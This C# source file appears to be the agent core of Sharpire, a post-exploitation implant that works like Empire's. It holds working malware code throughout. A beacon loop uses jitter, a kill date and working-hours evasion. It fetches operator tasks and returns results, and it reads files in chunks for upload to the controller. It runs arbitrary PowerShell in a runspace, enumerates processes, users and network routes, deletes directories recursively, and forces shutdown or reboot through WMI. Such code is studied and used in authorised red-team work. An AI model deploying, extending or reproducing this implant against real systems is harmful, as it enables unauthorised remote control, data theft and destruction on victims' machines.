using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Management;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace Sharpire
{
    class Agent
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool IsWow64Process([In] IntPtr process, [Out] out bool wow64Process);

        private DateTime killDate;
        private byte[] packets;
        
        private SessionInfo sessionInfo;
        private Coms coms;
        private JobTracking jobTracking;

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public Agent(SessionInfo sessionInfo)
        {

            this.sessionInfo = sessionInfo;
            coms = new Coms(sessionInfo);
            jobTracking = new JobTracking();
        }

        ////////////////////////////////////////////////////////////////////////////////
        public void Execute()
        {
            while (true)
            {
                Run();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal Coms GetComs()
        {
            return coms;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Main Loop
        ////////////////////////////////////////////////////////////////////////////////
        private void Run()
        {
            ////////////////////////////////////////////////////////////////////////////////
            if (killDate.CompareTo(DateTime.Now) > 0 || coms.MissedCheckins > sessionInfo.GetDefaultLostLimit())
            {
                jobTracking.CheckAgentJobs(ref packets, ref coms);

                if (packets.Length > 0)
                {
                    coms.SendMessage(packets);
                }

                string message = "";
                if(killDate.CompareTo(DateTime.Now) > 0)
                {
                    message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting: past killdate";
                }
                else
                {
                    message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting: Lost limit reached";
                }

                ushort result = 0;
                coms.SendMessage(coms.EncodePacket(2, message, result));
                Environment.Exit(1);
            }

            ////////////////////////////////////////////////////////////////////////////////
            
            if (null != sessionInfo.GetWorkingHoursStart() && null != sessionInfo.GetWorkingHoursEnd())
            {
                DateTime now = DateTime.Now;

                if ((sessionInfo.GetWorkingHoursEnd() - sessionInfo.GetWorkingHoursStart()).Hours < 0)
                {
                    sessionInfo.SetWorkingHoursStart(sessionInfo.GetWorkingHoursStart().AddDays(-1));
                }

                if (now.CompareTo(sessionInfo.GetWorkingHoursStart()) > 0 
                    && now.CompareTo(sessionInfo.GetWorkingHoursEnd()) < 0)
                {
                    TimeSpan sleep = sessionInfo.GetWorkingHoursStart().Subtract(now);
                    if (sleep.CompareTo(0) < 0)
                    {
                        sleep = (sessionInfo.GetWorkingHoursStart().AddDays(1) - now);
                    }
                    Thread.Sleep((int)sleep.TotalMilliseconds);
                }
            }

            ////////////////////////////////////////////////////////////////////////////////
            if (0 != sessionInfo.GetDefaultDelay())
            {
                int max = (int)((sessionInfo.GetDefaultJitter() + 1) * sessionInfo.GetDefaultDelay());
                if (max > int.MaxValue)
                {
                    max = int.MaxValue - 1;
                }

                int min = (int)((sessionInfo.GetDefaultJitter() - 1) * sessionInfo.GetDefaultDelay());
                if (min < 0)
                {
                    min = 0;
                }

                int sleepTime;
                if (min == max)
                {
                    sleepTime = min;
                }
                else
                {
                    Random random = new Random();
                    sleepTime = random.Next(min, max);
                }

                Thread.Sleep(sleepTime * 1000);
            }

            ////////////////////////////////////////////////////////////////////////////////
            byte[] jobResults = jobTracking.GetAgentJobsOutput(ref coms);
            if (0 < jobResults.Length)
            {
                coms.SendMessage(jobResults);
            }

            ////////////////////////////////////////////////////////////////////////////////
            byte[] taskData = coms.GetTask();
            if (taskData.Length > 0)
            {
                coms.MissedCheckins = 0;
                if (String.Empty != Encoding.UTF8.GetString(taskData))
                {
                    coms.DecodeRoutingPacket(taskData, ref jobTracking);
                }
            }
            GC.Collect();
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal static byte[] GetFilePart(string file, int index, int chunkSize)
        {
            byte[] output = new byte[0];
            try
            {
                //Don't shoot the translator, please
                FileInfo fileInfo = new FileInfo(file);
                using (FileStream fileStream = File.OpenRead(file))
                {
                    if (fileInfo.Length < chunkSize)
                    {
                        if (index == 0)
                        {
                            output = new byte[fileInfo.Length];
                            fileStream.Read(output, 0, output.Length);
                            return output;
                        }
                        else
                        {
                            return output;
                        }
                    }
                    else
                    {
                        output = new byte[chunkSize];
                        int start = index * chunkSize;
                        fileStream.Seek(start, 0);
                        int count = fileStream.Read(output, 0, output.Length);
                        if (count > 0)
                        {
                            if (count != chunkSize)
                            {
                                byte[] output2 = new byte[count];
                                Array.Copy(output, output2, count);
                                return output2;
                            }
                            else
                            {
                                return output;
                            }
                        }
                        else
                        {
                            return output;
                        }
                    }
                }
            }
            catch
            {
                return output;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Almost Done - Finish move copy delete
        ////////////////////////////////////////////////////////////////////////////////
        internal static string InvokeShellCommand(string command, string arguments)
        {
            if (arguments.Contains("*\"\\\\*")) 
            {
                arguments = arguments.Replace("\"\\\\","FileSystem::\"\\\\");
            }
            else if (arguments.Contains("*\\\\*")) 
            {
                arguments = arguments.Replace("\\\\", "FileSystem::\\");
            }
            string output = "";
            if (command.ToLower() == "shell")
            {
                if (command.Length > 0)
                {
                    output = RunPowerShell(arguments);
                }
                else
                {
                    output = "no shell command supplied";
                }
                output += "\n\r..Command execution completed.";
            }
            else
            {
                if (command == "ls" || command == "dir" || command == "gci")
                {
                    output = GetChildItem(arguments);
                }
                else if (command == "mv" || command == "move")
                {
                    Console.WriteLine(arguments);
                    string[] parts = arguments.Split(' ');
                    if (2 != parts.Length)
                        return "Invalid mv|move command";
                    MoveFile(parts.FirstOrDefault(), parts.LastOrDefault());
                    output = "[+] Executed " + command + " " + arguments;
                }
                else if (command == "cp" || command == "copy")
                {
                    string[] parts = arguments.Split(' ');
                    if (2 != parts.Length)
                        return "Invalid cp|copy command";
                    CopyFile(parts.FirstOrDefault(), parts.LastOrDefault());
                    output = "[+] Executed " + command + " " + arguments;
                }
                else if (command == "rm" || command == "del" || command == "rmdir")
                {
                    DeleteFile(arguments);
                    output = "[+] Executed " + command + " " + arguments;
                }
                else if (command == "cd")
                {
                    Directory.SetCurrentDirectory(arguments);
                }
                else if (command == "ifconfig" || command == "ipconfig")
                {
                    output = Ifconfig();
                }
                else if (command == "ps" || command == "tasklist")
                {
                    output = Tasklist(arguments);
                }
                else if (command == "route")
                {
                    output = Route(arguments);
                }
                else if (command == "whoami" || command == "getuid")
                {
                    output = WindowsIdentity.GetCurrent().Name;
                }
                else if (command == "hostname")
                {
                    output = Dns.GetHostName();
                }
                else if (command == "reboot" || command == "restart")
                {
                    Shutdown("2");
                }
                else if (command == "shutdown")
                {
                    Shutdown("5");
                }
                else
                {
                    RunPowerShell(arguments);
                    output = "executed " + command + " " + arguments + "\n\r";
                }
            }
            return output;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static void Shutdown(string flags)
        {
            ManagementClass managementClass = new ManagementClass("Win32_OperatingSystem");
            managementClass.Get();

            managementClass.Scope.Options.EnablePrivileges = true;
            ManagementBaseObject managementBaseObject = managementClass.GetMethodParameters("Win32Shutdown");

            // Flag 1 means we want to shut down the system. Use "2" to reboot.
            managementBaseObject["Flags"] = flags;
            managementBaseObject["Reserved"] = "0";
            foreach (ManagementObject managementObject in managementClass.GetInstances())
            {
                managementObject.InvokeMethod("Win32Shutdown", managementBaseObject, null);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static string Route(string arguments)
        {
            Dictionary<uint, string> adapters = new Dictionary<uint, string>();
            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
            scope.Connect();
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection objectCollection = objectSearcher.Get();
            foreach (ManagementObject managementObject in objectCollection)
            {
                adapters[(uint)managementObject["InterfaceIndex"]] = ManagementObjectToString((string[])managementObject["IPAddress"]);
            }

            List<string> lines = new List<string>();
            ObjectQuery query2 = new ObjectQuery("SELECT * FROM Win32_IP4RouteTable ");
            ManagementObjectSearcher objectSearcher2 = new ManagementObjectSearcher(scope, query2);
            ManagementObjectCollection objectCollection2 = objectSearcher2.Get();
            foreach (ManagementObject managementObject in objectCollection2)
            {
                string destination = "";
                if (managementObject["Destination"] != null)
                {
                    destination = (string)managementObject["Destination"];
                }

                string netmask = "";
                if (managementObject["Mask"] != null)
                {
                    netmask = (string)managementObject["Mask"];
                }

                string nextHop = "0.0.0.0";
                if ((string)managementObject["NextHop"] != "0.0.0.0")
                {
                    nextHop = (string)managementObject["NextHop"];
                }

                int index = (int)managementObject["InterfaceIndex"];

                string adapter = "";
                if (!adapters.TryGetValue((uint)index, out adapter))
                {
                    adapter = "127.0.0.1";
                }

                string metric = Convert.ToString((int)managementObject["Metric1"]);

                lines.Add(
                    string.Format("{0,-17} : {1,-50}\n", "Destination", destination) +
                    string.Format("{0,-17} : {1,-50}\n", "Netmask", netmask) +
                    string.Format("{0,-17} : {1,-50}\n", "NextHop", nextHop) +
                    string.Format("{0,-17} : {1,-50}\n", "Interface", adapter) +
                    string.Format("{0,-17} : {1,-50}\n", "Metric", metric)    
                );

            }
            return string.Join("\n", lines.ToArray());
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static string Tasklist(string arguments)
        {
            Dictionary<int, string> owners = new Dictionary<int, string>();
            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
            scope.Connect();
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection objectCollection = objectSearcher.Get();
            foreach (ManagementObject managementObject in objectCollection)
            {
                string name = "";
                string[] owner = new string[2];
                managementObject.InvokeMethod("GetOwner", (object[]) owner);
                if (owner[0] != null)
                {
                    name = owner[1] + "\\" + owner[0];
                }
                else
                {
                    name = "N/A";
                }
                managementObject.InvokeMethod("GetOwner", (object[]) owner);
                owners[Convert.ToInt32(managementObject["Handle"])] = name;
            }

            List<string[]> lines = new List<string[]>();
            System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcesses();
            foreach (System.Diagnostics.Process process in processes)
            {
                string architecture;
                int workingSet;
                bool isWow64Process;
                try
                {
                    IsWow64Process(process.Handle, out isWow64Process);
                    if (isWow64Process)
                    {
                        architecture = "x64";
                    }
                    else
                    {
                        architecture = "x86";
                    }
                }
                catch
                {
                    architecture = "N/A";
                }
                workingSet = (int)(process.WorkingSet64 / 1000000);

                string userName = "";
                try
                {
                    if (!owners.TryGetValue(process.Id, out userName))
                    {
                        userName = "False";
                    }
                }
                catch
                {
                    userName = "Catch";
                }

                lines.Add(
                    new string[] {process.ProcessName,
                        process.Id.ToString(),
                        architecture,
                        userName,
                        Convert.ToString(workingSet)
                    }
                );

            }

            string[][] linesArray = lines.ToArray();

            //https://stackoverflow.com/questions/232395/how-do-i-sort-a-two-dimensional-array-in-c
            Comparer<int> comparer = Comparer<int>.Default;
            Array.Sort<String[]>(linesArray, (x, y) => comparer.Compare(Convert.ToInt32(x[1]), Convert.ToInt32(y[1])));
            
            List<string> sortedLines = new List<string>();
            string[] headerArray = {"ProcessName", "PID", "Arch", "UserName", "MemUsage"};
            sortedLines.Add(string.Format("{0,-30} {1,-8} {2,-6} {3,-28} {4,8}", headerArray));
            foreach (string[] line in linesArray)
            {
                sortedLines.Add(string.Format("{0,-30} {1,-8} {2,-6} {3,-28} {4,8} M", line));
            }
            return string.Join("\n", sortedLines.ToArray());
        } 

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static string Ifconfig()
        {
            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
            scope.Connect();
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection objectCollection = objectSearcher.Get();
            List<string> lines = new List<string>();
            foreach (ManagementObject managementObject in objectCollection)
            {
                if ((bool)managementObject["IPEnabled"] == true)
                {
                    lines.Add(
                        string.Format("{0,-17} : {1,-50}\n", "Description", managementObject["Description"]) +
                        string.Format("{0,-17} : {1,-50}\n", "MACAddress", managementObject["MACAddress"]) +
                        string.Format("{0,-17} : {1,-50}\n", "DHCPEnabled", managementObject["DHCPEnabled"]) +
                        string.Format("{0,-17} : {1,-50}\n", "IPAddress", ManagementObjectToString((string[])managementObject["IPAddress"])) +
                        string.Format("{0,-17} : {1,-50}\n", "IPSubnet", ManagementObjectToString((string[])managementObject["IPSubnet"])) +
                        string.Format("{0,-17} : {1,-50}\n", "DefaultIPGateway", ManagementObjectToString((string[])managementObject["DefaultIPGateway"])) +
                        string.Format("{0,-17} : {1,-50}\n", "DNSServer", ManagementObjectToString((string[])managementObject["DNSServerSearchOrder"])) +
                        string.Format("{0,-17} : {1,-50}\n", "DNSHostName", managementObject["DNSHostName"]) +
                        string.Format("{0,-17} : {1,-50}\n", "DNSSuffix", ManagementObjectToString((string[])managementObject["DNSDomainSuffixSearchOrder"]))
                    );
                }
            }
            return string.Join("\n", lines.ToArray());
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private static void DeleteFile(string sourceFile)
        {
            if (IsFile(sourceFile))
                File.Delete(sourceFile);
            else
                Directory.Delete(sourceFile, true);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private static void CopyFile(string sourceFile, string destinationFile)
        {
            if (IsFile(sourceFile))
            {
                File.Copy(sourceFile, destinationFile);
            }
            else
            {
                //https://stackoverflow.com/questions/58744/copy-the-entire-contents-of-a-directory-in-c-sharp
                foreach (string dirPath in Directory.GetDirectories(sourceFile, "*", SearchOption.AllDirectories))
                {
                    Directory.CreateDirectory(dirPath.Replace(sourceFile, destinationFile));
                }

                foreach (string newPath in Directory.GetFiles(sourceFile, "*.*", SearchOption.AllDirectories))
                {
                    File.Copy(newPath, newPath.Replace(sourceFile, destinationFile), true);
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private static void MoveFile(string sourceFile, string destinationFile)
        {
            if (IsFile(sourceFile))
                File.Move(sourceFile, destinationFile);
            else
                Directory.Move(sourceFile, destinationFile);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private static bool IsFile(string filePath)
        {
            FileAttributes fileAttributes = File.GetAttributes(filePath);
            return (fileAttributes & FileAttributes.Directory) == FileAttributes.Directory ? false : true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static string ManagementObjectToString(string[] managementObject)
        {
            string output;
            if (managementObject != null && managementObject.Length > 0)
            {
                output = string.Join(", ", managementObject);
            }
            else
            {
                output = " ";
            }
            return output;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static string GetChildItem(string folder)
        {
            if (folder == "")
            {
                folder = ".";
            }

            try
            {
                List<string> lines = new List<string>();
                DirectoryInfo directoryInfo = new DirectoryInfo(folder);
                FileInfo[] files = directoryInfo.GetFiles();
                foreach (FileInfo file in files)
                {
                    lines.Add(file.ToString());
                    //output += Directory.GetLastWriteTime(file.FullName) + "\t";
                    //output += file.Length + "\t";
                    //output += file.Name + "\n\r";
                }
                return string.Join("\n", lines.ToArray());
            }
            catch (Exception error)
            {
                return "[!] Error: " + error + " (or cannot be accessed).";
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        internal static string RunPowerShell(string command)
        {
            using (Runspace runspace = RunspaceFactory.CreateRunspace())
            {
                runspace.Open();

                using (Pipeline pipeline = runspace.CreatePipeline())
                {
                    pipeline.Commands.AddScript(command);
                    pipeline.Commands.Add("Out-String");

                    StringBuilder sb = new StringBuilder();
                    try
                    {
                        Collection<PSObject> results = pipeline.Invoke();
                        foreach (PSObject obj in results)
                        {
                            sb.Append(obj.ToString());
                        }
                    }
                    catch (ParameterBindingException error)
                    {
                        sb.Append("[-] ParameterBindingException: " + error.Message);
                    }                    
                    catch (CmdletInvocationException error)
                    {
                        sb.Append("[-] CmdletInvocationException: " + error.Message);
                    }
                    catch (RuntimeException error)
                    {
                        sb.Append("[-] RuntimeException: " + error.Message);
                    }

                    return sb.ToString();
                }
            }
        }
    }
}